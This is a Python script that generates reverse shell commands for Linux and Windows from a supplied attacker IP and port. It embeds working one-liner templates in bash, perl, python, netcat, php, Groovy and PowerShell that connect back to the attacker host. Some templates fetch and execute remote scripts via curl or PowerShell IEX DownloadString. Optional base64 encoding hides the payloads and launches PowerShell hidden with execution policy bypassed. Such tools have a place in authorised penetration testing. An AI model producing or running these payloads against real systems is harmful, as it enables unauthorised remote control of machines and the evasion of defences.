#!/usr/bin/env python3

import json 
import argparse
import platform
import enum
import base64
import sys

def main():

	global g_payloads_json

	parser = argparse.ArgumentParser(description="Reverse Shell Command Generator")
	parser.add_argument("platform", help="Platform", choices=['windows', 'linux'])
	parser.add_argument("lhost", help="Local IP address")
	parser.add_argument("lport", help="Local port", type=int)
	parser.add_argument("--raw", help="Use this option to include more payloads (PowerShell, Groovy, etc.)", action="store_true")
	parser.add_argument("--encode", help="Use this option to get the encoded version of the command", action="store_true")
	args = parser.parse_args()

	payloads = []
	payloads_json = json.loads(g_payloads_json)
	for i in range(len(payloads_json)):
		p = Payload(args.lhost, args.lport, args.encode)
		p.p_type = payloads_json[i]["type"]
		p.p_subtype = payloads_json[i]["subtype"]
		p.p_format = payloads_json[i]["format"]
		p.p_os = payloads_json[i]["os"]
		p.p_template = payloads_json[i]["template"]
		p.p_web_delivery = payloads_json[i]["web-delivery"]
		payloads.append(p)
	
	for p in payloads:
		if args.platform == p.p_os:
			print("%s[%s]%s" % (C_BLU, p.p_os.upper(), C_RST), end="")
			print("%s[%s]%s" % (C_BLU, p.p_subtype.upper(), C_RST), end="")
			
			payload_raw = p.get_payload(encode=False)
			payload_encoded = p.get_payload(encode=True)
			
			if args.encode:
				print("%s[%s]%s" % (C_YEL, "ENCODED", C_RST))
				if payload_encoded == "":
					print_msg(Level.error, "No encoder was found for this payload")
				else:
					print_msg(Level.success, payload_encoded)
			else:
				if p.p_format == "raw":
					if args.raw:
						print("%s[%s]%s" % (C_RED, "RAW", C_RST))
						print_msg(Level.success, "Printing raw payload...\n%s" % payload_raw)
					else:
						print("%s[%s]%s" % (C_YEL, "ENCODED", C_RST))
						
						if payload_encoded == "":
							print_msg(Level.error, "No encoder was found for this payload")
						else:
							print_msg(Level.success, payload_encoded)
				else:
					print("%s[%s]%s" % (C_GRE, p.p_format.upper(), C_RST))
					print_msg(Level.success, payload_raw)
			
			if p.p_web_delivery:
				print_msg(Level.warning, "This payload requires a web server.")
			
			print()

# Text colors
C_RST = "\033[0m" if "linux" in platform.system().lower() else ""
C_GRE = "\033[92m" if "linux" in platform.system().lower() else ""
C_BLU = "\033[94m" if "linux" in platform.system().lower() else ""
C_YEL = "\033[93m" if "linux" in platform.system().lower() else ""
C_RED = "\033[91m" if "linux" in platform.system().lower() else ""

class Level(enum.Enum): 
	info = 1
	warning = 2
	success = 3
	error = 4

class Payload():
	p_lhost = ""
	p_lport = ""
	p_type = ""
	p_subtype = ""
	p_format = ""
	p_os = ""
	p_template = ""
	p_web_delivery = False
	p_encode = False
	
	def __init__(self, lhost, lport, encode=False):
		self.p_lhost = lhost
		self.p_lport = lport
		self.p_encode = encode
	
	def get_payload(self, encode=False):
		res = ""
		payload_raw = self.p_template
		payload_raw = payload_raw.replace("{LHOST}", "%s" % (self.p_lhost))
		payload_raw = payload_raw.replace("{LPORT}", "%i" % (self.p_lport))
		if not encode:
			res = payload_raw
		else:
			res = self.encode(payload_raw)
		return res 
	
	def encode(self, payload_raw):
		res = ""
		if self.p_os == "windows":
		    if self.p_type == "powershell":
		    	# https://www.powershellmagazine.com/2013/04/19/pstip-powershell-command-line-switches-shortcuts/
		    	# nop = NoProfile; noni = NoInteractice; w = WindowStyle; ep = ExecutionPolicy; e = EncodedCommand 
		        res = "powershell -nop -noni -w Hidden -ep Bypass -e {}".format(base64.b64encode(payload_raw.encode('UTF-16LE')).decode('ascii'))
		elif self.p_os == "linux":
		    if self.p_type == "shell":
		        res = "bash -c \"{echo,%s}|{base64,-d}|{bash,-i}\"" % base64.b64encode(payload_raw.encode(encoding='ascii')).decode('ascii')
		    elif self.p_type == "python":
		        res = "python -c \"exec('%s'.decode('base64'))\"" % base64.b64encode(payload_raw.encode(encoding='ascii')).decode('ascii')
		    elif self.p_type == "perl":
		        res = "perl -MMIME::Base64 -e \"eval(decode_base64('%s'))\"" % base64.b64encode(payload_raw.encode(encoding='ascii')).decode('ascii')
		else:
		    print("{}[!] Unknown OS: {}{}".format(C_YEL, self.p_os, C_RST))
		return res

def print_msg(level, msg):
	res = ""
	color = ""
	sign = ""
	if level is Level.info:
		color = C_BLU
		sign = "*"
	elif level is Level.warning:
		color = C_YEL
		sign = "!"
	elif level is Level.success:
		color = C_GRE
		sign = "+"
	elif level is Level.error:
		color = C_RED
		sign = "-"
	print("%s[%s]%s %s" % (color, sign, C_RST, msg))

g_payloads_json = """
[
	{
		"type": "shell",
		"subtype": "bash",
		"format": "one-liner",
		"os": "linux",
		"template": "bash -c \\\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\\\"",
		"web-delivery": false
	},
	{
		"type": "shell", 
		"subtype": "perl",
		"format": "one-liner",
		"os": "linux",
		"template": "perl -e 'use Socket;$i=\\\"{LHOST}\\\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'",
		"web-delivery": false
	},
	{
		"type": "shell",
		"subtype": "perl",
		"format": "one-liner",
		"os": "linux",
		"template": "curl http://{LHOST}/rev.pl -o /tmp/rev.pl ; perl /tmp/rev.pl",
		"web-delivery": true
	},
	{
		"type": "shell", 
		"subtype": "python",
		"format": "one-liner",
		"os": "linux",
		"template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{LHOST}\\\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'",
		"web-delivery": false
	},
	{
		"type": "shell", 
		"subtype": "netcat",
		"format": "one-liner",
		"os": "linux",
		"template": "nc -e /bin/sh {LHOST} {LPORT}",
		"web-delivery": false
	},
	{
		"type": "shell",
		"subtype": "bash",
		"format": "one-liner",
		"os": "linux",
		"template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
		"web-delivery": false
	},
	{
		"type": "shell",
		"subtype": "php",
		"format": "one-liner",
		"os": "linux",
		"template": "php -r '$sock=fsockopen(\\\"{LHOST}\\\",{LPORT});exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
		"web-delivery": false
	},
	{
		"type": "groovy",
		"subtype": "groovy",
		"format": "raw",
		"os": "linux",
		"template": "String host=\\\"{LHOST}\\\";\\nint port={LPORT};\\nString cmd=\\\"/bin/sh\\\";\\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){\\n\\twhile(pi.available()>0)so.write(pi.read());\\n\\twhile(pe.available()>0)so.write(pe.read());\\n\\twhile(si.available()>0)po.write(si.read());\\n\\tso.flush();\\n\\tpo.flush();\\n\\tThread.sleep(50);\\n\\ttry {\\n\\t\\tp.exitValue();\\n\\t\\tbreak;\\n\\t}catch (Exception e){}\\n};\\np.destroy();\\ns.close();",
		"web-delivery": false
	},
	{
		"type": "powershell",
		"subtype": "powershell",
		"format": "one-liner",
		"os": "windows",
		"template": "IEX (New-Object System.Net.WebClient).DownloadString('http://{LHOST}/tools/Invoke-PowerShellTcp.ps1'); Invoke-powershellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}",
		"web-delivery": true
	},
	{
		"type": "powershell",
		"subtype": "powershell",
		"format": "one-liner",
		"os": "windows",
		"template": "IEX (New-Object System.Net.WebClient).DownloadString('http://{LHOST}/tools/powercat.ps1'); powercat -c {LHOST} -p {LPORT} -e cmd",
		"web-delivery": true
	},
	{
		"type": "powershell",
		"subtype": "powershell",
		"format": "raw",
		"os": "windows",
		"template": "$c=New-Object Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});\\n$s=$c.GetStream();\\n[byte[]]$b=0..65535|%{0};\\nwhile(($i=$s.Read($b, 0, $b.Length)) -ne 0)\\n{\\n\\t$d=(New-Object -t Text.ASCIIEncoding).GetString($b,0,$i-1);\\n\\tif($d -eq \\\"exit\\\"){break}\\n\\t$sb=if($i -gt 1) {try {iex \\\"$d 2>&1\\\" | Out-String} catch {$_ | Out-string}} else{\\\"\\\"};\\n\\t$sb2=$sb+\\\"PS \\\"+(pwd).Path+\\\"> \\\";\\n\\t$sdb=([text.encoding]::ASCII).GetBytes($sb2)\\n\\t$s.Write($sdb,0,$sdb.Length);\\n\\t$s.Flush()\\n};\\n$c.Close()",
		"web-delivery": false
	}
]
"""

if __name__ == '__main__':
    main()

